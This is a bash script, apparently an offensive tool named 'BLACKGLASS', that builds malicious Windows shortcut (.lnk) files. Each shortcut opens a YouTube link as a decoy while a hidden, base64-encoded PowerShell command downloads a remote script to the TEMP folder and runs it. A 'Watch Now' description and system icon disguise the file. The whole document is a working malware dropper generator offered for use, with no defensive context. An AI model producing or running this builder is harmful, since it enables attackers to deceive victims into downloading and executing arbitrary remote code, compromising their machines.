#!/bin/bash
echo "[*] BLACKGLASS: LNK Payload Builder"
read -p "YouTube URL: " YT_URL
read -p "Payload URL (PS1): " PAYLOAD_URL
read -p "Output name (no extension): " NAME
ENCODED=$(echo -n "Invoke-WebRequest -Uri '$PAYLOAD_URL' -OutFile \$env:TEMP\\x.ps1; Start-Process \$env:TEMP\\x.ps1" | iconv -t utf-16le | base64 -w 0)
cat > lnk_gen.py <<PYEOF
import pylnk3
lnk = pylnk3.for_file("C:\\\\Windows\\\\System32\\\\cmd.exe")
lnk.arguments = 'cmd /c start "" "$YT_URL" && powershell -w hidden -enc $ENCODED'
lnk.icon = r"C:\\\\Windows\\\\System32\\\\shell32.dll"
lnk.description = "Watch Now"
lnk.working_dir = r"C:\\\\Windows\\\\System32\\\\"
lnk.save("output/$NAME.lnk")
PYEOF
python lnk_gen.py
echo "[+] LNK created: output/$NAME.lnk"
